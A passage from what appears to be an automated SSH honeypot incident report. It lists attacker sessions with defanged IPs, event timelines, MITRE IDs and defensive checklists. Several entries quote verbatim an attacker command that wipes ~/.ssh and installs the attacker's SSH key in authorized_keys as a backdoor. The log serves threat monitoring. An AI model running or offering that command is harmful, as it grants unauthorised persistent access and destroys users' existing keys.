| `2026-09-25 12:13:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.112.192[.]91` to AbuseIPDB if not already reported
- [ ] Block `193.112.192[.]91` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5d6b2ba3f916

| Field | Detail |
|---|---|
| **Source IP** | `193.112.192[.]91` |
| **First Seen** | 2026-09-25 12:13 |
| **Last Seen** | 2026-09-25 12:13 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `hostname` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 12:13:51` | `cowrie.session.connect` |
| `2026-09-25 12:13:51` | `cowrie.client.version` |
| `2026-09-25 12:13:51` | `cowrie.client.kex` |
| `2026-09-25 12:13:53` | `cowrie.login.success` |
| `2026-09-25 12:13:54` | `cowrie.session.params` |
| `2026-09-25 12:13:54` | `cowrie.command.input` |
| `2026-09-25 12:13:54` | `cowrie.log.closed` |
| `2026-09-25 12:13:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.112.192[.]91` to AbuseIPDB if not already reported
- [ ] Block `193.112.192[.]91` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-518f008d1424

| Field | Detail |
|---|---|
| **Source IP** | `193.112.192[.]91` |
| **First Seen** | 2026-09-25 12:14 |
| **Last Seen** | 2026-09-25 12:14 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `hostname` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 12:14:00` | `cowrie.session.connect` |
| `2026-09-25 12:14:01` | `cowrie.client.version` |
| `2026-09-25 12:14:01` | `cowrie.client.kex` |
| `2026-09-25 12:14:02` | `cowrie.login.success` |
| `2026-09-25 12:14:03` | `cowrie.session.params` |
| `2026-09-25 12:14:03` | `cowrie.command.input` |
| `2026-09-25 12:14:03` | `cowrie.log.closed` |
| `2026-09-25 12:14:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.112.192[.]91` to AbuseIPDB if not already reported
- [ ] Block `193.112.192[.]91` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-674a526d5682

| Field | Detail |
|---|---|
| **Source IP** | `193.112.192[.]91` |
| **First Seen** | 2026-09-25 12:14 |
| **Last Seen** | 2026-09-25 12:14 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `hostname` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 12:14:03` | `cowrie.session.connect` |
| `2026-09-25 12:14:03` | `cowrie.client.version` |
| `2026-09-25 12:14:04` | `cowrie.client.kex` |
| `2026-09-25 12:14:05` | `cowrie.login.success` |
| `2026-09-25 12:14:07` | `cowrie.session.params` |
| `2026-09-25 12:14:07` | `cowrie.command.input` |
| `2026-09-25 12:14:07` | `cowrie.log.closed` |
| `2026-09-25 12:14:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.112.192[.]91` to AbuseIPDB if not already reported
- [ ] Block `193.112.192[.]91` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1d15a4f4aa53

| Field | Detail |
|---|---|
| **Source IP** | `190.181.44[.]194` |
| **First Seen** | 2026-09-25 12:20 |
| **Last Seen** | 2026-09-25 12:20 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 12:20:51` | `cowrie.session.connect` |
| `2026-09-25 12:20:51` | `cowrie.client.version` |
| `2026-09-25 12:20:51` | `cowrie.client.kex` |
| `2026-09-25 12:20:52` | `cowrie.login.success` |
| `2026-09-25 12:20:52` | `cowrie.session.params` |
| `2026-09-25 12:20:52` | `cowrie.command.input` |
| `2026-09-25 12:20:52` | `cowrie.command.failed` |
| `2026-09-25 12:20:53` | `cowrie.log.closed` |
| `2026-09-25 12:20:54` | `cowrie.session.params` |
| `2026-09-25 12:20:54` | `cowrie.command.input` |
| `2026-09-25 12:20:54` | `cowrie.session.file_download` |
| `2026-09-25 12:20:54` | `cowrie.log.closed` |
| `2026-09-25 12:20:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.181.44[.]194` to AbuseIPDB if not already reported
- [ ] Block `190.181.44[.]194` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2d7a0ca5b34f

| Field | Detail |
|---|---|
| **Source IP** | `190.181.44[.]194` |
| **First Seen** | 2026-09-25 12:20 |
| **Last Seen** | 2026-09-25 12:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 12:20:54` | `cowrie.session.connect` |
| `2026-09-25 12:20:54` | `cowrie.client.version` |
| `2026-09-25 12:20:54` | `cowrie.client.kex` |
| `2026-09-25 12:20:55` | `cowrie.login.success` |
| `2026-09-25 12:20:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.181.44[.]194` to AbuseIPDB if not already reported
- [ ] Block `190.181.44[.]194` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9d1bda899c78

| Field | Detail |
|---|---|
| **Source IP** | `190.181.44[.]194` |
| **First Seen** | 2026-09-25 12:20 |
| **Last Seen** | 2026-09-25 12:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 12:20:55` | `cowrie.session.connect` |
| `2026-09-25 12:20:55` | `cowrie.client.version` |
| `2026-09-25 12:20:55` | `cowrie.client.kex` |
| `2026-09-25 12:20:56` | `cowrie.login.success` |
| `2026-09-25 12:20:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.181.44[.]194` to AbuseIPDB if not already reported
- [ ] Block `190.181.44[.]194` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2a73c70555d8

| Field | Detail |
|---|---|
| **Source IP** | `118.145.234[.]151` |
| **First Seen** | 2026-09-25 12:24 |
| **Last Seen** | 2026-09-25 12:29 |
| **Session Duration** | 303s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 12:24:24` | `cowrie.session.connect` |
| `2026-09-25 12:24:24` | `cowrie.client.version` |
| `2026-09-25 12:24:24` | `cowrie.client.kex` |
| `2026-09-25 12:24:27` | `cowrie.login.success` |
| `2026-09-25 12:29:27` | `cowrie.session.file_upload` |
| `2026-09-25 12:29:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.145.234[.]151` to AbuseIPDB if not already reported
- [ ] Block `118.145.234[.]151` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5f6156b4ce62

| Field | Detail |
|---|---|
| **Source IP** | `34.91.0[.]68` |
| **First Seen** | 2026-09-25 12:26 |
| **Last Seen** | 2026-09-25 12:26 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 12:26:06` | `cowrie.session.connect` |
| `2026-09-25 12:26:06` | `cowrie.client.version` |
| `2026-09-25 12:26:06` | `cowrie.client.kex` |
| `2026-09-25 12:26:06` | `cowrie.login.success` |
| `2026-09-25 12:26:07` | `cowrie.session.params` |
| `2026-09-25 12:26:07` | `cowrie.command.input` |
| `2026-09-25 12:26:07` | `cowrie.command.failed` |
| `2026-09-25 12:26:07` | `cowrie.log.closed` |
| `2026-09-25 12:26:08` | `cowrie.session.params` |
| `2026-09-25 12:26:08` | `cowrie.command.input` |
| `2026-09-25 12:26:08` | `cowrie.session.file_download` |
| `2026-09-25 12:26:08` | `cowrie.log.closed` |
| `2026-09-25 12:26:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.91.0[.]68` to AbuseIPDB if not already reported
- [ ] Block `34.91.0[.]68` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7d3c4deae8f3

| Field | Detail |
|---|---|
| **Source IP** | `34.91.0[.]68` |
| **First Seen** | 2026-09-25 12:26 |
| **Last Seen** | 2026-09-25 12:26 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 12:26:08` | `cowrie.session.connect` |
| `2026-09-25 12:26:08` | `cowrie.client.version` |
| `2026-09-25 12:26:08` | `cowrie.client.kex` |
| `2026-09-25 12:26:08` | `cowrie.login.success` |
| `2026-09-25 12:26:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.91.0[.]68` to AbuseIPDB if not already reported
- [ ] Block `34.91.0[.]68` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5653d8b54013

| Field | Detail |
|---|---|
| **Source IP** | `34.91.0[.]68` |
| **First Seen** | 2026-09-25 12:26 |
| **Last Seen** | 2026-09-25 12:26 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 12:26:09` | `cowrie.session.connect` |
| `2026-09-25 12:26:09` | `cowrie.client.version` |
| `2026-09-25 12:26:09` | `cowrie.client.kex` |
| `2026-09-25 12:26:09` | `cowrie.login.success` |
| `2026-09-25 12:26:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.91.0[.]68` to AbuseIPDB if not already reported
- [ ] Block `34.91.0[.]68` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-63f78fb95206

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]121` |
| **First Seen** | 2026-09-25 12:33 |
| **Last Seen** | 2026-09-25 12:33 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST, /bin/busybox TEST, cat /proc, ./` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 12:33:02` | `cowrie.session.connect` |
| `2026-09-25 12:33:02` | `cowrie.login.success` |
| `2026-09-25 12:33:03` | `cowrie.session.params` |
| `2026-09-25 12:33:03` | `cowrie.command.input` |
| `2026-09-25 12:33:04` | `cowrie.command.input` |
| `2026-09-25 12:33:04` | `cowrie.command.input` |
| `2026-09-25 12:33:05` | `cowrie.command.input` |
| `2026-09-25 12:33:05` | `cowrie.command.failed` |
| `2026-09-25 12:33:05` | `cowrie.log.closed` |
| `2026-09-25 12:33:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]121` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]121` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5af36f255fa9

| Field | Detail |
|---|---|
| **Source IP** | `182.43.235[.]75` |
| **First Seen** | 2026-09-25 12:41 |
| **Last Seen** | 2026-09-25 12:45 |
| **Session Duration** | 268s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 12:41:19` | `cowrie.session.connect` |
| `2026-09-25 12:41:19` | `cowrie.client.version` |
| `2026-09-25 12:41:19` | `cowrie.client.kex` |
| `2026-09-25 12:41:20` | `cowrie.login.success` |
| `2026-09-25 12:45:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.43.235[.]75` to AbuseIPDB if not already reported
- [ ] Block `182.43.235[.]75` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9d472bf59de2

| Field | Detail |
|---|---|
| **Source IP** | `182.43.235[.]75` |
| **First Seen** | 2026-09-25 12:41 |
| **Last Seen** | 2026-09-25 12:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 12:41:45` | `cowrie.session.connect` |
| `2026-09-25 12:41:45` | `cowrie.client.version` |
| `2026-09-25 12:41:45` | `cowrie.client.kex` |
| `2026-09-25 12:41:46` | `cowrie.login.success` |
| `2026-09-25 12:41:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.43.235[.]75` to AbuseIPDB if not already reported
- [ ] Block `182.43.235[.]75` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c3739e7946a9

| Field | Detail |
|---|---|
| **Source IP** | `147.90.234[.]22` |
| **First Seen** | 2026-09-25 12:47 |
| **Last Seen** | 2026-09-25 12:48 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 12:47:54` | `cowrie.session.connect` |
| `2026-09-25 12:47:54` | `cowrie.client.version` |
| `2026-09-25 12:47:54` | `cowrie.client.kex` |
| `2026-09-25 12:47:54` | `cowrie.login.success` |
| `2026-09-25 12:47:54` | `cowrie.session.params` |
| `2026-09-25 12:47:54` | `cowrie.command.input` |
| `2026-09-25 12:47:54` | `cowrie.command.failed` |
| `2026-09-25 12:47:54` | `cowrie.log.closed` |
| `2026-09-25 12:47:55` | `cowrie.session.params` |
| `2026-09-25 12:47:55` | `cowrie.command.input` |
| `2026-09-25 12:47:55` | `cowrie.session.file_download` |
| `2026-09-25 12:47:55` | `cowrie.log.closed` |
| `2026-09-25 12:48:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `147.90.234[.]22` to AbuseIPDB if not already reported
- [ ] Block `147.90.234[.]22` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2adf4503e725

| Field | Detail |
|---|---|
| **Source IP** | `147.90.234[.]22` |
| **First Seen** | 2026-09-25 12:47 |
| **Last Seen** | 2026-09-25 12:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 12:47:55` | `cowrie.session.connect` |
| `2026-09-25 12:47:55` | `cowrie.client.version` |
| `2026-09-25 12:47:55` | `cowrie.client.kex` |
| `2026-09-25 12:47:55` | `cowrie.login.success` |
| `2026-09-25 12:47:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `147.90.234[.]22` to AbuseIPDB if not already reported
- [ ] Block `147.90.234[.]22` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-45c7a5e0ffc5

| Field | Detail |
|---|---|
| **Source IP** | `147.90.234[.]22` |
| **First Seen** | 2026-09-25 12:48 |
| **Last Seen** | 2026-09-25 12:48 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 12:48:00` | `cowrie.session.connect` |
| `2026-09-25 12:48:00` | `cowrie.client.version` |
| `2026-09-25 12:48:00` | `cowrie.client.kex` |
| `2026-09-25 12:48:00` | `cowrie.login.success` |
| `2026-09-25 12:48:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `147.90.234[.]22` to AbuseIPDB if not already reported
- [ ] Block `147.90.234[.]22` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-42defff18056

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-09-25 12:50 |
| **Last Seen** | 2026-09-25 12:50 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 12:50:41` | `cowrie.session.connect` |
| `2026-09-25 12:50:41` | `cowrie.client.version` |
| `2026-09-25 12:50:41` | `cowrie.client.kex` |
| `2026-09-25 12:50:41` | `cowrie.login.success` |
| `2026-09-25 12:50:41` | `cowrie.direct-tcpip.request` |
| `2026-09-25 12:50:42` | `cowrie.direct-tcpip.data` |
| `2026-09-25 12:50:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-343871c2fe64

| Field | Detail |
|---|---|
| **Source IP** | `103.13.210[.]12` |
| **First Seen** | 2026-09-25 12:51 |
| **Last Seen** | 2026-09-25 12:51 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 12:51:01` | `cowrie.session.connect` |
| `2026-09-25 12:51:01` | `cowrie.client.version` |
| `2026-09-25 12:51:01` | `cowrie.client.kex` |
| `2026-09-25 12:51:01` | `cowrie.login.success` |
| `2026-09-25 12:51:02` | `cowrie.session.params` |
| `2026-09-25 12:51:02` | `cowrie.command.input` |
| `2026-09-25 12:51:02` | `cowrie.command.failed` |
| `2026-09-25 12:51:02` | `cowrie.log.closed` |
| `2026-09-25 12:51:03` | `cowrie.session.params` |
| `2026-09-25 12:51:03` | `cowrie.command.input` |
| `2026-09-25 12:51:03` | `cowrie.session.file_download` |
| `2026-09-25 12:51:03` | `cowrie.log.closed` |
| `2026-09-25 12:51:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.13.210[.]12` to AbuseIPDB if not already reported
- [ ] Block `103.13.210[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a272a0f43d2b

| Field | Detail |
|---|---|
| **Source IP** | `103.13.210[.]12` |
| **First Seen** | 2026-09-25 12:51 |
| **Last Seen** | 2026-09-25 12:51 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 12:51:03` | `cowrie.session.connect` |
| `2026-09-25 12:51:03` | `cowrie.client.version` |
| `2026-09-25 12:51:03` | `cowrie.client.kex` |
| `2026-09-25 12:51:04` | `cowrie.login.success` |
| `2026-09-25 12:51:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.13.210[.]12` to AbuseIPDB if not already reported
- [ ] Block `103.13.210[.]12` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e4528ceee243

| Field | Detail |
|---|---|
| **Source IP** | `103.13.210[.]12` |
| **First Seen** | 2026-09-25 12:51 |
| **Last Seen** | 2026-09-25 12:51 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 12:51:04` | `cowrie.session.connect` |
| `2026-09-25 12:51:04` | `cowrie.client.version` |
| `2026-09-25 12:51:04` | `cowrie.client.kex` |
| `2026-09-25 12:51:04` | `cowrie.login.success` |
| `2026-09-25 12:51:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.13.210[.]12` to AbuseIPDB if not already reported
- [ ] Block `103.13.210[.]12` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-997f2ea00b8a

| Field | Detail |
|---|---|
| **Source IP** | `211.254.212[.]59` |
| **First Seen** | 2026-09-25 12:54 |
| **Last Seen** | 2026-09-25 12:54 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 12:54:35` | `cowrie.session.connect` |
| `2026-09-25 12:54:35` | `cowrie.client.version` |
| `2026-09-25 12:54:35` | `cowrie.client.kex` |
| `2026-09-25 12:54:36` | `cowrie.login.success` |
| `2026-09-25 12:54:37` | `cowrie.session.params` |
| `2026-09-25 12:54:37` | `cowrie.command.input` |
| `2026-09-25 12:54:37` | `cowrie.command.failed` |
| `2026-09-25 12:54:37` | `cowrie.log.closed` |
| `2026-09-25 12:54:38` | `cowrie.session.params` |
| `2026-09-25 12:54:38` | `cowrie.command.input` |
| `2026-09-25 12:54:38` | `cowrie.session.file_download` |
| `2026-09-25 12:54:38` | `cowrie.log.closed` |
| `2026-09-25 12:54:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.254.212[.]59` to AbuseIPDB if not already reported
- [ ] Block `211.254.212[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-95fbdf46fc69

| Field | Detail |
|---|---|
| **Source IP** | `211.254.212[.]59` |
| **First Seen** | 2026-09-25 12:54 |
| **Last Seen** | 2026-09-25 12:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 12:54:38` | `cowrie.session.connect` |
| `2026-09-25 12:54:38` | `cowrie.client.version` |
| `2026-09-25 12:54:39` | `cowrie.client.kex` |
| `2026-09-25 12:54:39` | `cowrie.login.success` |
| `2026-09-25 12:54:40` | `cowrie.session.closed` |

**Recommended Actions:**
